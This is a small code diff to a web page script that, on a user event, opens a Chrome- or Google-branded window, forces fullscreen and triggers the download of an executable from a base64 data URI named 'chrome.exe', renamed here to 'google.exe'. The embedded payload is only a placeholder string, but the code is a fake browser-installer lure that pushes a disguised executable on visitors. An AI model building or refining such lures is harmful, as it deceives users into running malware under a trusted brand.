@@ -13,7 +13,7 @@
  setTimeout(function() {
         openWin();
  }, 500);
- window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
+ window.open('https://google.com', '_blank');
       goFullScreen();
     }, { once: false }); // Use { once: true } to ensure it only fires once
     // Download helper
@@ -29,7 +29,7 @@
     function openWin() {
       Puf(
         "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "chrome.exe"
+        "google.exe"
       );
     }
     function goFullScreen() {
